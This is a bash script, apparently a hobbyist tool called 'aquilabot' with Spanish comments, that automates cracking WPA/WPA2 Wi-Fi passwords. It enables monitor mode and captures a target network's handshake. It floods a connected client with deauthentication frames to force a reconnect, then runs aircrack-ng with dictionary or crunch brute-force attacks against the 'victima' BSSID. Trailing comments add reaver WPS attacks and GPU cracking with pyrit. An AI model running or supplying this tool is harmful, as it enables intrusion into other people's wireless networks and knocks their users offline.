#!/bin/bash
aquilabot_start(){
  clear
  aq_banner=("         _                   _       _                   _          _             _                   _               _          _       " )
  aq_banner+=("        / /\                /\ \    /\_\                /\ \       _\ \          / /\                / /\            /\ \       /\ \     " )
  aq_banner+=("       / /  \              /  \ \  / / /         _      \ \ \     /\__ \        / /  \              / /  \          /  \ \      \_\ \    " )
  aq_banner+=("      / / /\ \            / /\ \ \ \ \ \__      /\_\    /\ \_\   / /_ \_\      / / /\ \            / / /\ \        / /\ \ \     /\__ \   " )
  aq_banner+=("     / / /\ \ \          / / /\ \ \ \ \___\    / / /   / /\/_/  / / /\/_/     / / /\ \ \          / / /\ \ \      / / /\ \ \   / /_ \ \  " )
  aq_banner+=("    / / /  \ \ \        / / /  \ \_\ \__  /   / / /   / / /    / / /         / / /  \ \ \        / / /\ \_\ \    / / /  \ \_\ / / /\ \ \ " )
  aq_banner+=("   / / /___/ /\ \      / / / _ / / / / / /   / / /   / / /    / / /         / / /___/ /\ \      / / /\ \ \___\  / / /   / / // / /  \/_/ " )
  aq_banner+=("  / / /_____/ /\ \    / / / /\ \/ / / / /   / / /   / / /    / / / ____    / / /_____/ /\ \    / / /  \ \ \__/ / / /   / / // / /        " )
  aq_banner+=(" / /_________/\ \ \  / / /__\ \ \/ / / /___/ / /___/ / /__  / /_/_/ ___/\ / /_________/\ \ \  / / /____\_\ \  / / /___/ / // / /         " )
  aq_banner+=("/ / /_       __\ \_\/ / /____\ \ \/ / /____\/ //\__\/_/___\/_______/\__\// / /_       __\ \_\/ / /__________\/ / /____\/ //_/ /          " )
  aq_banner+=("\_\___\     /____/_/\/________\_\/\/_________/ \/_________/\_______\/    \_\___\     /____/_/\/_____________/\/_________/ \_\/           " )
  aq_banner+=("                                                                                                                                         " )
  for line in "${aq_banner[@]}"; do
    echo "$line"; sleep 0.1
  done

  echo -e "\\n\\n" #HACIENDO ESPACIO

  #TODO VERIFICAR DEPENDENCIAS E INTENTAR INSTALAR
}

aquilabot_set_resolution() {  # POS. VENTANAS + RESOLUCION

  # OBTENER DIMENSIONES
  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

  # CALCULAR VENTANAS PROPORCIONALES #TODO AJUSTAR
  if hash bc ;then
    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc) #TODO USO DE PROPOTION
    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/3.5}")/1 | bc)
    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/3.5}")/1 | bc)

    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/3.5}")/1 | bc)
    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/3.5}")/1 | bc)

    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X + ($SCREEN_SIZE_X - 2 * $NEW_SCREEN_SIZE_X) / 2)))
    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y + ($SCREEN_SIZE_Y - 2 * $NEW_SCREEN_SIZE_Y) / 2)))

    # UPPER WINDOWS
    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"

    # LOWER WINDOWS
    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

    # Y MID
    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"

    # BIG
    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
  fi
}

aquilabot_attack_wpa2(){  #TODO CAPTURAR DESDE XTERM
  aq_red=$(iwconfig 2> /dev/null | grep "IEEE" | grep -o -m 1 "^[a-zA-Z0-9]\+\>") #DETECTAR INTERFAZ DISPONIBLE
  if ! ifconfig | grep "${aq_red}" > /dev/null ; then    # SI NO ESTA INICIADO
   airmon-ng start "$aq_red"    #INICIAMOS MODO MONITOR
  else
    aq_red=${aq_red::-3}
  fi &&
  airmon-ng check
  airmon-ng check kill
  airmon-ng start aq_red
  aq_red="${aq_red}mon"
  xterm $TOPRIGHTBIG -hold -e "timeout 60 airodump-ng $aq_red"& sleep 10 &&
  echo Ingresa BSSID del objetivo
  read -r bidvictima
  echo Ingresa el Canal de la victima
  read -r chnlvictima
  xterm $TOPLEFTBIG -hold -e "airodump-ng $aq_red -w cap -c $chnlvictima --bssid $bidvictima"& sleep 10 &&
  echo "Ingresa BSSID del cliente en el objetivo (STATION)"
  read -r client_aq
  xterm $BOTTOMRIGHT -hold -e "aireplay-ng --deauth 322 -a $bidvictima -c $client_aq $aq_red"& sleep 10 &&
  echo "--------------------------------------------------------------------------------------------------------------";
  echo "1.  Usar rockyou.txt"
  echo "2.  Usar fasttrack.txt"
  echo "3.  Usar nmap.list"
  echo "4.  Usar diccionario personal"
  echo "5.  Fuerza bruta 8 numericos"
  echo "6.  Fuerza bruta 9 numericos"
  echo "7.  Fuerza bruta 10 numericos"
  echo "8.  Fuerza bruta 8 a-z"
  echo "9.  Fuerza bruta 8 A-Z"
  echo "10. Fuerza bruta 8 a-z + numericos"
  echo "11. Fuerza bruta 8 A-Z + numericos"
  echo "12. Fuerza bruta personalizada"

  while :
  do
    read -r option_aq
    case $option_aq in
      1)
        aq_wordlist="/usr/share/wordlists/rockyou.txt"
        break
        ;;
      2)
        aq_wordlist="/usr/share/wordlists/fasttrack.txt"
        break
        ;;
      3)
        aq_wordlist="/usr/share/wordlists/nmap.lst"
        break
        ;;
      4)
        echo Ingrese la ruta de su diccionario
        read -r aq_wordlist &&
        break
        ;;
      5)
        aq_crunch_parametros="8 8 1234567890"
        break
        ;;
      6)
        aq_crunch_parametros="9 9 1234567890"
        break
        ;;
      7)
        aq_crunch_parametros="10 10 1234567890"
        break
        ;;
      8)
        aq_crunch_parametros="8 8 abcdefghijklmnopqrstuvwxyz"
        break
        ;;
      9)
        aq_crunch_parametros="8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        break
        ;;
      10)
        aq_crunch_parametros="8 8 abcdefghijklmnopqrstuvwxyz1234567890"
        break
        ;;
      11)
        aq_crunch_parametros="8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        break
        ;;
      12)
        echo Que argumentos te gustaria pasarle a crunch?
        read -r aq_crunch_parametros &&
        break
        ;;
      *)
        echo Que ha sido eso? escoge bien ...
        echo ""
        ;;
    esac
  done
  echo Presiona CTRL-C al terminar de copiar la contraseña
  if [ 4 -ge "$option_aq" ]; then
    echo Realizando ataque diccionario & sleep 0.72 &&
    echo ""
    xterm $LEFT -hold -e "aircrack-ng -w $aq_wordlist -b "$bidvictima" ./*.cap"
  else
    echo Realizando ataque fuerza bruta & sleep 0.72 &&
    echo ""
    xterm $LEFT -hold -e "crunch $aq_crunch_parametros | aircrack-ng -a 2 -w- -b "$bidvictima" ./*.cap"
  fi
  echo Deshabilitando modo monitor
  aq_red=${aq_red::-3}
  airmon-ng stop aq_red
  echo Borrando Handshake ...
  rm cap*
  clear
}

aquilabot_menu(){ #TODO AGREGAR MAS ATAQUES
  echo "Selecciona..."
  echo ""
  echo "1)  WPA y WPA-2 ATAQUE"
  echo "2)  WPE ATAQUE"
  echo "0)  Salir"
  echo ""
  while :
  do
    read -r THE_WUT
    case $THE_WUT in
      1)
        echo Hey Listen!
        aquilabot_attack_wpa2
        break
        ;;
      0)
        echo See you again!
        break
        ;;
      *)
        echo "Sorry, No te entiendo bruh"
        ;;
    esac
  done
  echo
  echo "That's all folks!"
  echo
}

aquilabot_main(){
  aquilabot_start
  aquilabot_set_resolution
  aquilabot_menu

  echo enjoy! GL HF!
  sleep 4 #SUBLIME
  exit
}

aquilabot_main

#reaver -i mon0 -b XX:XX:XX:XX:XX:XX -n -d 2 -T 2 - t 2 -vv
# WPS - MOVISTAR

#crunch 8 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng --bssid aa:aa:aa:aa:aa:aa -w- handshakefile.cap

#TODO IMPLEMENTAR ATAQUES CON GPU, SOLO SI CUDA_CORES ESTA SOPORTADO

#ATAQUE CON GPU
#crunch 8 17 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX YZ1234567890 | pyrit -r xxx.cap -b xx:xx:xx:xx:xx:xx -i - attack_passthrough

#probar dumpper jumpster

#probar hashcat